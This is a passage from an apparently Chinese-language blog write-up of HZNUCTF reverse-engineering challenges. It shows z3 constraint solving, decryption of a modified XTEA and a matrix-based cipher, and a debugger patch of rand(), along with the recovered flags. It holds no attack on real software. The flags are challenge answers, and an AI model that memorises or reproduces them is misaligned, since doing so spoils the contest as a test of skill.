class="token operator">+</span> <span class="token number">21</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">222</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">224</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">26</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token operator">-</span><span class="token number">58</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">29</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">130106</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> <span class="token builtin">all</span><span class="token punctuation">(</span>ii1iIi1i11i<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Congratulation!!!"</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"wrong_wrong!!!"</span><span class="token punctuation">)</span></code></pre>

<p>是计下flag里面每个字符出现的次数检验是否符合那个字符串的格式化的对应次数，</p>
<p>将下面的z3解出可以得到一个字符串<strong>H1Z1N1U1C1T1F1{1a6d275f7-463}</strong></p>
<p>一个字符一个数字配对，代表该字符在原flag中出现的次数。</p>
<p>除去前面HZNUCTF{，将括号内的字母和对应数字做映射，利用原代码中的**”111111116257645365477364777645752361”**去一一对应。</p>
<p>解密代码：</p>
<pre class="language-Python" data-language="Python"><code class="language-Python">from z3 import *

def decrypt(encrypted):
    mapping &#x3D; &quot;6257645365477364777645752361&quot;
    
    char_map &#x3D; &#123;&#125;

    remaining_map &#x3D; &#123;
        &#39;6&#39;: &#39;a&#39;,
        &#39;2&#39;: &#39;d&#39;,
        &#39;5&#39;: &#39;7&#39;,
        &#39;7&#39;: &#39;f&#39;,
        &#39;4&#39;: &#39;-&#39;,
        &#39;3&#39;: &#39;6&#39;,
        &#39;1&#39;: &#39;&#125;&#39;
    &#125;
    char_map.update(remaining_map)
    
    result &#x3D; &quot;HZNUCTF&#123;&quot;
    for num in mapping:
        result +&#x3D; char_map[num]
    
    return result

s &#x3D; Solver()

Enc &#x3D; [Int(f&#39;x&#123;i&#125;&#39;) for i in range(30)]

s.add(7 * Enc[0] &#x3D;&#x3D; 504)
s.add(9 * Enc[0] - 5 * Enc[1] &#x3D;&#x3D; 403)
s.add((2 * Enc[0] - 5 * Enc[1]) + 10 * Enc[2] &#x3D;&#x3D; 799)
s.add(3 * Enc[0] + 8 * Enc[1] + 15 * Enc[2] + 20 * Enc[3] &#x3D;&#x3D; 2938)
s.add((5 * Enc[0] + 15 * Enc[1] + 20 * Enc[2] - 19 * Enc[3]) + 1 * Enc[4] &#x3D;&#x3D; 2042)
s.add((7 * Enc[0] + 1 * Enc[1] + 9 * Enc[2] - 11 * Enc[3]) + 2 * Enc[4] + 5 * Enc[5] &#x3D;&#x3D; 1225)
s.add(11 * Enc[0] + 22 * Enc[1] + 33 * Enc[2] + 44 * Enc[3] + 55 * Enc[4] + 66 * Enc[5] - 77 * Enc[6] &#x3D;&#x3D; 7975)
s.add(((21 * Enc[0] + 23 * Enc[1] + 3 * Enc[2] + 24 * Enc[3] - 55 * Enc[4]) + 6 * Enc[5] - 7 * Enc[6]) + 15 * Enc[7] &#x3D;&#x3D; 229)
s.add((2 * Enc[0] + 26 * Enc[1] + 13 * Enc[2] + 0 * Enc[3] - 65 * Enc[4]) + 15 * Enc[5] + 29 * Enc[6] + 1 * Enc[7] + 20 * Enc[8] &#x3D;&#x3D; 2107)
s.add((10 * Enc[0] + 7 * Enc[1] + -9 * Enc[2] + 6 * Enc[3] + 7 * Enc[4] + 1 * Enc[5] + 22 * Enc[6] + 21 * Enc[7] - 22 * Enc[8]) + 30 * Enc[9] &#x3D;&#x3D; 4037)
s.add((15 * Enc[0] + 59 * Enc[1] + 56 * Enc[2] + 66 * Enc[3] + 7 * Enc[4] + 1 * Enc[5] - 122 * Enc[6]) + 21 * Enc[7] + 32 * Enc[8] + 3 * Enc[9] - 10 * Enc[10] &#x3D;&#x3D; 4950)
s.add((((13 * Enc[0] + 66 * Enc[1] + 29 * Enc[2] + 39 * Enc[3] - 33 * Enc[4]) + 13 * Enc[5] - 2 * Enc[6]) + 42 * Enc[7] + 62 * Enc[8] + 1 * Enc[9] - 10 * Enc[10]) + 11 * Enc[11] &#x3D;&#x3D; 12544)
s.add((((23 * Enc[0] + 6 * Enc[1] + 29 * Enc[2] + 3 * Enc[3] - 3 * Enc[4]) + 63 * Enc[5] - 25 * Enc[6]) + 2 * Enc[7] + 32 * Enc[8] + 1 * Enc[9] - 10 * Enc[10]) + 11 * Enc[11] - 12 * Enc[12] &#x3D;&#x3D; 6585)
s.add(((((223 * Enc[0] + 6 * Enc[1] - 29 * Enc[2] - 53 * Enc[3] - 3 * Enc[4]) + 3 * Enc[5] - 65 * Enc[6]) + 0 * Enc[7] + 36 * Enc[8] + 1 * Enc[9] - 15 * Enc[10]) + 16 * Enc[11] - 18 * Enc[12]) + 13 * Enc[13] &#x3D;&#x3D; 6893)
s.add(((((29 * Enc[0] + 13 * Enc[1] - 9 * Enc[2] - 93 * Enc[3]) + 33 * Enc[4] + 6 * Enc[5] + 65 * Enc[6] + 1 * Enc[7] - 36 * Enc[8]) + 0 * Enc[9] - 16 * Enc[10]) + 96 * Enc[11] - 68 * Enc[12]) + 33 * Enc[13] - 14 * Enc[14] &#x3D;&#x3D; 1883)
s.add((((69 * Enc[0] + 77 * Enc[1] - 93 * Enc[2] - 12 * Enc[3]) + 0 * Enc[4] + 0 * Enc[5] + 1 * Enc[6] + 16 * Enc[7] + 36 * Enc[8] + 6 * Enc[9] + 19 * Enc[10] + 66 * Enc[11] - 8 * Enc[12]) + 38 * Enc[13] - 16 * Enc[14]) + 15 * Enc[15] &#x3D;&#x3D; 8257)
s.add(((((23 * Enc[0] + 2 * Enc[1] - 3 * Enc[2] - 11 * Enc[3]) + 12 * Enc[4] + 24 * Enc[5] + 1 * Enc[6] + 6 * Enc[7] + 14 * Enc[8] - 0 * Enc[9]) + 1 * Enc[10] + 68 * Enc[11] - 18 * Enc[12]) + 68 * Enc[13] - 26 * Enc[14]) + 15 * Enc[15] - 16 * Enc[16] &#x3D;&#x3D; 5847)
s.add((((((24 * Enc[0] + 0 * Enc[1] - 1 * Enc[2] - 15 * Enc[3]) + 13 * Enc[4] + 4 * Enc[5] + 16 * Enc[6] + 67 * Enc[7] + 146 * Enc[8] - 50 * Enc[9]) + 16 * Enc[10] + 6 * Enc[11] - 1 * Enc[12]) + 69 * Enc[13] - 27 * Enc[14]) + 45 * Enc[15] - 6 * Enc[16]) + 17 * Enc[17] &#x3D;&#x3D; 18257)
s.add(((((25 * Enc[0] + 26 * Enc[1] - 89 * Enc[2]) + 16 * Enc[3] + 19 * Enc[4] + 44 * Enc[5] + 36 * Enc[6] + 66 * Enc[7] - 150 * Enc[8] - 250 * Enc[9]) + 166 * Enc[10] + 126 * Enc[11] - 11 * Enc[12]) + 690 * Enc[13] - 207 * Enc[14]) + 46 * Enc[15] + 6 * Enc[16] + 7 * Enc[17] - 18 * Enc[18] &#x3D;&#x3D; 12591)
s.add((((((5 * Enc[0] + 26 * Enc[1] + 8 * Enc[2] + 160 * Enc[3] + 9 * Enc[4] - 4 * Enc[5]) + 36 * Enc[6] + 6 * Enc[7] - 15 * Enc[8] - 20 * Enc[9]) + 66 * Enc[10] + 16 * Enc[11] - 1 * Enc[12]) + 690 * Enc[13] - 20 * Enc[14]) + 46 * Enc[15] + 6 * Enc[16] + 7 * Enc[17] - 18 * Enc[18]) + 19 * Enc[19] &#x3D;&#x3D; 52041)
s.add(((((((29 * Enc[0] - 26 * Enc[1]) + 0 * Enc[2] + 60 * Enc[3] + 90 * Enc[4] - 4 * Enc[5]) + 6 * Enc[6] + 6 * Enc[7] - 16 * Enc[8] - 21 * Enc[9]) + 69 * Enc[10] + 6 * Enc[11] - 12 * Enc[12]) + 69 * Enc[13] - 20 * Enc[14] - 46 * Enc[15]) + 65 * Enc[16] + 0 * Enc[17] - 1 * Enc[18]) + 39 * Enc[19] - 20 * Enc[20] &#x3D;&#x3D; 20253)
s.add((((((((45 * Enc[0] - 56 * Enc[1]) + 10 * Enc[2] + 650 * Enc[3] - 900 * Enc[4]) + 44 * Enc[5] + 66 * Enc[6] - 6 * Enc[7] - 6 * Enc[8] - 21 * Enc[9]) + 9 * Enc[10] - 6 * Enc[11] - 12 * Enc[12]) + 69 * Enc[13] - 2 * Enc[14] - 406 * Enc[15]) + 651 * Enc[16] + 2 * Enc[17] - 10 * Enc[18]) + 69 * Enc[19] - 0 * Enc[20]) + 21 * Enc[21] &#x3D;&#x3D; 18768)
s.add((((((555 * Enc[0] - 6666 * Enc[1]) + 70 * Enc[2] + 510 * Enc[3] - 90 * Enc[4]) + 499 * Enc[5] + 66 * Enc[6] - 66 * Enc[7] - 610 * Enc[8] - 221 * Enc[9]) + 9 * Enc[10] - 23 * Enc[11] - 102 * Enc[12]) + 6 * Enc[13] + 2050 * Enc[14] - 406 * Enc[15]) + 665 * Enc[16] + 333 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 777 * Enc[20] + 201 * Enc[21] - 22 * Enc[22] &#x3D;&#x3D; 111844)
s.add((((((((1 * Enc[0] - 22 * Enc[1]) + 333 * Enc[2] + 4444 * Enc[3] - 5555 * Enc[4]) + 6666 * Enc[5] - 666 * Enc[6]) + 676 * Enc[7] - 660 * Enc[8] - 22 * Enc[9]) + 9 * Enc[10] - 73 * Enc[11] - 107 * Enc[12]) + 6 * Enc[13] + 250 * Enc[14] - 6 * Enc[15]) + 65 * Enc[16] + 39 * Enc[17] + 10 * Enc[18] + 69 * Enc[19] + 777 * Enc[20] + 201 * Enc[21] - 2 * Enc[22]) + 23 * Enc[23] &#x3D;&#x3D; 159029)
s.add((((520 * Enc[0] - 222 * Enc[1]) + 333 * Enc[2] + 4 * Enc[3] - 56655 * Enc[4]) + 6666 * Enc[5] + 666 * Enc[6] + 66 * Enc[7] - 60 * Enc[8] - 220 * Enc[9]) + 99 * Enc[10] + 73 * Enc[11] + 1007 * Enc[12] + 7777 * Enc[13] + 2500 * Enc[14] + 6666 * Enc[15] + 605 * Enc[16] + 390 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 99999 * Enc[20] + 210 * Enc[21] + 232 * Enc[22] + 23 * Enc[23] - 24 * Enc[24] &#x3D;&#x3D; 2762025)
s.add(((((1323 * Enc[0] - 22 * Enc[1]) + 333 * Enc[2] + 4 * Enc[3] - 55 * Enc[4]) + 666 * Enc[5] + 666 * Enc[6] + 66 * Enc[7] - 660 * Enc[8] - 220 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 100 * Enc[12] + 777 * Enc[13] + 2500 * Enc[14] + 6666 * Enc[15] + 605 * Enc[16] + 390 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 9999 * Enc[20] + 210 * Enc[21] + 232 * Enc[22] + 23 * Enc[23] - 24 * Enc[24]) + 25 * Enc[25] &#x3D;&#x3D; 1551621)
s.add((((((777 * Enc[0] - 22 * Enc[1]) + 6969 * Enc[2] + 4 * Enc[3] - 55 * Enc[4]) + 666 * Enc[5] - 6 * Enc[6]) + 96 * Enc[7] - 60 * Enc[8] - 220 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 100 * Enc[12] + 777 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + 65 * Enc[16] + 90 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 999 * Enc[20] + 21 * Enc[21] + 232 * Enc[22] + 23 * Enc[23] - 24 * Enc[24]) + 25 * Enc[25] - 26 * Enc[26] &#x3D;&#x3D; 948348)
s.add(((((((97 * Enc[0] - 22 * Enc[1]) + 6969 * Enc[2] + 4 * Enc[3] - 56 * Enc[4]) + 96 * Enc[5] - 6 * Enc[6]) + 96 * Enc[7] - 60 * Enc[8] - 20 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 10 * Enc[12] + 707 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + -9 * Enc[16] + 90 * Enc[17] + -2 * Enc[18] + 609 * Enc[19] + 0 * Enc[20] + 21 * Enc[21] + 2 * Enc[22] + 23 * Enc[23] - 24 * Enc[24]) + 25 * Enc[25] - 26 * Enc[26]) + 27 * Enc[27] &#x3D;&#x3D; 777044)
s.add((((((177 * Enc[0] - 22 * Enc[1]) + 699 * Enc[2] + 64 * Enc[3] - 56 * Enc[4] - 96 * Enc[5] - 66 * Enc[6]) + 96 * Enc[7] - 60 * Enc[8] - 20 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 10 * Enc[12] + 707 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + -9 * Enc[16] + 0 * Enc[17] + -2 * Enc[18] + 69 * Enc[19] + 0 * Enc[20] + 21 * Enc[21] + 222 * Enc[22] + 23 * Enc[23] - 224 * Enc[24]) + 25 * Enc[25] - 26 * Enc[26]) + 27 * Enc[27] - 28 * Enc[28] &#x3D;&#x3D; 185016)
s.add(((((((77 * Enc[0] - 2 * Enc[1]) + 6 * Enc[2] + 6 * Enc[3] - 96 * Enc[4] - 9 * Enc[5] - 6 * Enc[6]) + 96 * Enc[7] - 0 * Enc[8] - 20 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 10 * Enc[12] + 707 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + -9 * Enc[16] + 0 * Enc[17] + -2 * Enc[18] + 9 * Enc[19] + 0 * Enc[20] + 21 * Enc[21] + 222 * Enc[22] + 23 * Enc[23] - 224 * Enc[24]) + 26 * Enc[25] - -58 * Enc[26]) + 27 * Enc[27] - 2 * Enc[28]) + 29 * Enc[29] &#x3D;&#x3D; 130106)

for x in Enc:
    s.add(x &gt;&#x3D; 32)
    s.add(x &lt;&#x3D; 126)

if s.check() &#x3D;&#x3D; sat:
    m &#x3D; s.model()

    solution &#x3D; [m[x].as_long() if m[x] is not None else 0 for x in Enc]
    
    decrypted &#x3D; decrypt(solution)
    print(decrypted)
    
else:
    print(&quot;No solution found&quot;)</code></pre>

<p>HZNUCTF{ad7fa-76a7-ff6a-fffa-7f7d6a}</p>
<h3 id="XTEA"><a href="#XTEA" class="headerlink" title="XTEA"></a>XTEA</h3><p>初始化置种子srand了一次，然后这边里面判断是否有调试，然后又srand了一遍，可以忽略，种子就是0x7E8。</p>
<p>红框处是将输入字符串四个四个一组进行翻转。</p>
<p><img src="/images/1744633170177-8.png" alt="img" loading="lazy"></p>
<p>InitKey函数是用rand初始化了四个整数Key。</p>
<p><img src="/images/1744633170177-9.png" alt="img" loading="lazy"></p>
<p>XTea是魔改的，Delta是靠用户输入传进来的，那么这边Delta未知就需要爆破。</p>
<p><img src="/images/1744633170177-10.png" alt="img" loading="lazy"></p>
<p>题目描述说有点misc味，发现附件中还有个readme里面的压缩包密码就是标准Delta，<strong>2654435769 -&gt; 0x9E3779B9</strong></p>
<p>直接编写解密，使用该Delta就可以解出flag。</p>
<p>解密代码：</p>
<pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;
#include &lt;windows.h&gt;
#include &lt;string&gt;
#include &lt;time.h&gt;

unsigned int *__fastcall dec(int a1, unsigned int *a2, unsigned int *a3, unsigned int a4)
&#123;
    unsigned int *result; &#x2F;&#x2F; rax
    unsigned int v5;      &#x2F;&#x2F; [rsp+24h] [rbp+4h]
    unsigned int v6;      &#x2F;&#x2F; [rsp+44h] [rbp+24h]
    unsigned int v7;      &#x2F;&#x2F; [rsp+64h] [rbp+44h]
    int i;                &#x2F;&#x2F; [rsp+84h] [rbp+64h]

    v5 &#x3D; *a2;
    v6 &#x3D; *a3;
    v7 &#x3D; 0;
    v7 &#x3D; -a1 * 32;
    for (i &#x3D; 0; i &lt; 32; ++i)
    &#123;
        v6 -&#x3D; (*(DWORD *)(a4 + 4LL * ((v7 &gt;&gt; 11) &amp; 3)) + v7) ^ (v5 + ((v5 &gt;&gt; 5) ^ (16 * v5)));
        v7 +&#x3D; a1;
        v5 -&#x3D; (*(DWORD *)(a4 + 4LL * (v7 &amp; 3)) + v7) ^ (v6 + ((v6 &gt;&gt; 5) ^ (16 * v6)));
    &#125;
    *a2 &#x3D; v5;
    result &#x3D; a3;
    *a3 &#x3D; v6;
    return result;
&#125;

int main()
&#123;
    unsigned char buffer[] &#x3D; &#123;
        0x24, 0x23, 0xCB, 0x8C, 0x1A, 0x74, 0xA7, 0x09,
        0x8D, 0x67, 0x3C, 0xFB, 0x79, 0x3A, 0x08, 0xF6,
        0x1B, 0x24, 0xCC, 0xF1, 0xF2, 0x59, 0xFA, 0x39,
        0xCC, 0xE1, 0xAB, 0xF2, 0x72, 0x9F, 0x18, 0x17&#125;;
    srand(0x7e8);
    &#x2F;&#x2F; 初始化Key
    uint32_t key[4]&#123;&#125;;
    for (int i &#x3D; 0; i &lt; 4; i++)
        key[i] &#x3D; rand();

    for (int j &#x3D; 7; j &gt; 0; j--)
        dec(0x9E3779B9, (unsigned int *)(buffer + (j - 1) * 4), (unsigned int *)(buffer + j * 4), (uint32_t)key);

    &#x2F;&#x2F; 四个字节一组进行翻转
    for (int j &#x3D; 0; j &lt; 32; j +&#x3D; 4)
    &#123;
        auto tmp &#x3D; *((char *)buffer + j + 3) | (*((char *)buffer + j + 2) &lt;&lt; 8) | (*((char *)buffer + j + 1) &lt;&lt; 16) | (*((char *)buffer + j) &lt;&lt; 24);
        *(int *)(buffer + j) &#x3D; tmp;
    &#125;
    printf(&quot;%.32s\n&quot;, buffer);

    return 0;
&#125;</code></pre>

<p>HZNUCTF{ae6-9f57-4b74-b423-98eb}</p>
<h3 id="randomsystem"><a href="#randomsystem" class="headerlink" title="randomsystem"></a>randomsystem</h3><p>第一部分是输入64字节大小的0101二进制数据，然后进行转换到Hex（倒序），再倒序回来拆分半个字节转到ascii字符。</p>
<p>如：0101001001100101第一次函数后是0x65，0x52然后再翻转拆分为ascii字符’5’,’2’,’6’,’5’。</p>
<p><img src="/images/1744633170177-11.png" alt="img" loading="lazy"></p>
<p>根据判断判断出的字符可知要输入的是52 65 56 65 52 65 53 65的二进制数据。</p>
<pre class="language-none"><code class="language-none">0101001001100101010101100110010101010010011001010101001101100101</code></pre>

<p>底下的一些加密函数里面有花指令，是基础花指令，这边不做多赘述。</p>
<p>第一部分用固定种子的随机数初始化了一个v18数值列表。</p>
<p><img src="/images/1744633170177-12.png" alt="img" loading="lazy"></p>
<p>然后进行四次加密。</p>
<p><img src="/images/1744633170177-13.png" alt="img" loading="lazy"></p>
<p>Enc1是用随机数初始化的列表进行打乱输入字符串的顺序。</p>
<p><img src="/images/1744633170177-14.png" alt="img" loading="lazy"></p>
<p>Enc2是将输入字符串转存到另一个二维数组。</p>
<p><img src="/images/1744633170177-15.png" alt="img" loading="lazy"></p>
<p>第三个函数是将之前输入转换后的Key存到”Str”中，实际值就是<strong>ReVeReSe</strong></p>
<p>第四个函数是用一个全局的矩阵乘上输入数据。</p>
<p><img src="/images/1744633170178-16.png" alt="img" loading="lazy"></p>
<p>最后和Key进行循环异或加密。</p>
<p><img src="/images/1744633170178-17.png" alt="img" loading="lazy"></p>
<p>所以解密流程就是这几步的翻转，需要先计算出全局矩阵数据的逆矩阵，这一步用在线网站就可以解得。</p>
<p>Enc1由于是对称的可以直接用原函数，Enc3也可以直接用原函数把矩阵数据改成逆矩阵就是解密。</p>
<p>解密代码：</p>
<pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;
#include &lt;windows.h&gt;
#include &lt;string&gt;
#include &lt;time.h&gt;

void Enc1(char *Str, int *RdList)
&#123;
    char v3;   &#x2F;&#x2F; [esp+D3h] [ebp-1Dh]
    size_t i;  &#x2F;&#x2F; [esp+DCh] [ebp-14h]
    size_t v5; &#x2F;&#x2F; [esp+E8h] [ebp-8h]

    v5 &#x3D; 64;
    for (i &#x3D; 0;; ++i)
    &#123;
        auto result &#x3D; v5 &gt;&gt; 1;
        if (i &gt;&#x3D; v5 &gt;&gt; 1)
            break;
        if (RdList[i] &gt;&#x3D; 0 &amp;&amp; RdList[i] &lt; v5)
        &#123;
            v3 &#x3D; Str[i];
            Str[i] &#x3D; Str[v5 - RdList[i] - 1];
            Str[v5 - RdList[i] - 1] &#x3D; v3;
        &#125;
    &#125;
&#125;

void Enc2(char *a1, char *a2)
&#123;
    int j;  &#x2F;&#x2F; [esp+D0h] [ebp-20h]
    int i;  &#x2F;&#x2F; [esp+DCh] [ebp-14h]
    int v4; &#x2F;&#x2F; [esp+E8h] [ebp-8h]

    v4 &#x3D; 0;
    for (i &#x3D; 0; i &lt; 8; ++i)
    &#123;
        for (j &#x3D; 0; j &lt; 8; ++j)
            *&amp;a1[32 * i + 4 * j] &#x3D; a2[v4++];
    &#125;
&#125;

unsigned int dword_3FC368[] &#x3D; &#123;
    0x00000001, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000000, 0x00000001, 0x00000000,
    0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000001,
    0x00000000, 0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00000001, 0x00000001, 0x00000000,
    0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000001,
    0x00000000, 0x00000001, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000001, 0x00000000,
    0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000001,
    0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000001,
    0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001&#125;;

int inv[] &#x3D; &#123;
    1,-4,1,-2,0,5,-2,3,
    0,3,-1,1,0,-3,1,-2,
    0,-2,1,-1,0,2,-1,2,
    0,0,0,1,0,-1,0,0,
    0,-4,1,-1,1,4,-2,3,
    0,1,0,0,0,0,0,-1,
    0,1,0,0,0,-1,1,-1,
    0,-1,0,0,0,1,0,1,
&#125;;

int Enc3(int *a1, char *a2, char *a3)
&#123;
    int result; &#x2F;&#x2F; eax
    int k;      &#x2F;&#x2F; [esp+D0h] [ebp-20h]
    int j;      &#x2F;&#x2F; [esp+DCh] [ebp-14h]
    int i;      &#x2F;&#x2F; [esp+E8h] [ebp-8h]

    for (i &#x3D; 0; i &lt; 8; ++i)
    &#123;
        for (j &#x3D; 0; j &lt; 8; ++j)
        &#123;
            a3[32 * i + 4 * j] &#x3D; 0;
            for (k &#x3D; 0; k &lt; 8; ++k)
                a3[32 * i + 4 * j] +&#x3D; *&amp;a2[32 * k + 4 * j] * a1[8 * i + k];
        &#125;
        result &#x3D; i + 1;
    &#125;
    return result;
&#125;

void Dec2(char *a1, char *a2)
&#123;
    int j;
    int i;
    int v4;

    v4 &#x3D; 0;
    for (i &#x3D; 0; i &lt; 8; ++i)
    &#123;
        for (j &#x3D; 0; j &lt; 8; ++j)
            a2[v4++] &#x3D; a1[32 * i + 4 * j];
    &#125;
&#125;

unsigned char EncFlag[256] &#x3D; &#123;
    0x78, 0x01, 0x00, 0x00, 0x64, 0x01, 0x00, 0x00, 0xA9, 0x00, 0x00, 0x00, 0xF5, 0x01, 0x00, 0x00,
    0x15, 0x01, 0x00, 0x00, 0x49, 0x01, 0x00, 0x00, 0x8B, 0x00, 0x00, 0x00, 0x56, 0x01, 0x00, 0x00,
    0x7C, 0x01, 0x00, 0x00, 0x6D, 0x01, 0x00, 0x00, 0xA2, 0x00, 0x00, 0x00, 0x02, 0x01, 0x00, 0x00,
    0x7D, 0x01, 0x00, 0x00, 0x53, 0x01, 0x00, 0x00, 0x5B, 0x01, 0x00, 0x00, 0x33, 0x01, 0x00, 0x00,
    0x07, 0x01, 0x00, 0x00, 0x67, 0x01, 0x00, 0x00, 0xA2, 0x00, 0x00, 0x00, 0xE4, 0x01, 0x00, 0x00,
    0x36, 0x01, 0x00, 0x00, 0x4D, 0x01, 0x00, 0x00, 0x5A, 0x01, 0x00, 0x00, 0x53, 0x01, 0x00, 0x00,
    0x96, 0x00, 0x00, 0x00, 0xC2, 0x00, 0x00, 0x00, 0xAF, 0x00, 0x00, 0x00, 0x58, 0x01, 0x00, 0x00,
    0x9E, 0x00, 0x00, 0x00, 0xFA, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0xAF, 0x00, 0x00, 0x00,
    0x9E, 0x00, 0x00, 0x00, 0xAD, 0x00, 0x00, 0x00, 0x98, 0x00, 0x00, 0x00, 0x7B, 0x01, 0x00, 0x00,
    0x9E, 0x00, 0x00, 0x00, 0x24, 0x01, 0x00, 0x00, 0x82, 0x00, 0x00, 0x00, 0x6D, 0x01, 0x00, 0x00,
    0xC5, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0xC5, 0x00, 0x00, 0x00, 0xA1, 0x00, 0x00, 0x00,
    0xC6, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x00, 0xCF, 0x00, 0x00, 0x00, 0xF4, 0x00, 0x00, 0x00,
    0xCA, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0xCC, 0x00, 0x00, 0x00, 0xB0, 0x00, 0x00, 0x00,
    0xC1, 0x00, 0x00, 0x00, 0xFF, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
    0x9E, 0x00, 0x00, 0x00, 0xB5, 0x00, 0x00, 0x00, 0x91, 0x00, 0x00, 0x00, 0x61, 0x01, 0x00, 0x00,
    0x99, 0x00, 0x00, 0x00, 0x65, 0x01, 0x00, 0x00, 0xF6, 0x00, 0x00, 0x00, 0x97, 0x00, 0x00, 0x00&#125;;

int main()
&#123;
    &#x2F;&#x2F; First: 0101001001100101010101100110010101010010011001010101001101100101
    srand(2025);
    int RdList[0x80]&#123;&#125;;
    bool v16 &#x3D; true;
    int rd&#123;&#125;;
    for (int i &#x3D; 0; i &lt; 32; i++)
    &#123;
        do
        &#123;
            rd &#x3D; rand() % 32;
            rd &amp;&#x3D; 0x8000001F;
            v16 &#x3D; 1;
            for (int j &#x3D; 0; j &lt; i; j++)
            &#123;
                if (RdList[j] &#x3D;&#x3D; rd)
                &#123;
                    v16 &#x3D; 0;
                    break;
                &#125;
            &#125;
        &#125; while (!v16);
        RdList[i] &#x3D; rd;
    &#125;

    char Key[] &#x3D; &quot;ReVeReSe&quot;;
    int count &#x3D; 0;
    for (int i &#x3D; 0; i &lt; 256; i +&#x3D; 4)
    &#123;
        *(DWORD *)(EncFlag + i) ^&#x3D; Key[count % 8];
        count++;
    &#125;
    unsigned char Buffer_Dec[256]&#123;&#125;;

    Enc3((int *)inv, (char *)EncFlag, (char *)Buffer_Dec);
    Dec2((char *)Buffer_Dec, (char *)Buffer_Dec);
    Enc1((char *)Buffer_Dec, RdList);

    printf(&quot;HZNUCTF&#123;%.64s&#125;\n&quot;, Buffer_Dec);
    return 0;
&#125;</code></pre>

<p>HZNUCTF{3zfb899ac5c256d-7a8r59f0tccd-4fa6b8vfd111-a44ffy4r0-6dce5679da58}</p>
<h3 id="conforand（非预期）"><a href="#conforand（非预期）" class="headerlink" title="conforand（非预期）"></a>conforand（非预期）</h3><p>从srand查看交叉调用，发现是当前时间戳随机，并非伪随机。</p>
<p><img src="/images/1744633170178-18.png" alt="img" loading="lazy"></p>
<p><img src="/images/1744633170178-19.png" alt="img" loading="lazy"></p>
<p>查看rand交叉调用，发现是再init_sbox函数中调用，并且只获取了一次随机数，应该是利用rand的数值参与sbox生成。</p>
<p><img src="/images/1744633170178-20.png" alt="img" loading="lazy"></p>
<p>那么这边的思路就是爆破随机数，但由于是ollvm编译的，代码混乱，使用d810去混淆后也是很混乱，这边就直接不分析加密代码，采取黑盒爆破手段。</p>
<p>接下来是先检验加密对称性，运行发现是会输出加密后的内容。</p>
<p>检验步骤：</p>
<ol>
<li>随便输入一串字符串</li>
<li>断点rand，修改rand返回值rax寄存器为0。</li>
<li>得到输出加密内容。</li>
<li>再次输入字符串，断点在main的rc4调用处，将传参的字符串patch为刚刚程序输出的加密后字节数据。</li>
<li>断点rand，修改rand返回值rax寄存器为0。</li>
<li>观察输出加密内容是否为原字符串数据。</li>
</ol>
<p>Patch前：</p>
<p><img src="/images/1744633170178-21.png" alt="img" loading="lazy"></p>
<p>Patch后：</p>
<p><img src="/images/1744633170178-22.png" alt="img" loading="lazy"></p>
<p>发现是对称的，同一个rand值，加密函数也可以用于解密。</p>
<p><img src="/images/1744633170178-23.png" alt="img" loading="lazy"></p>
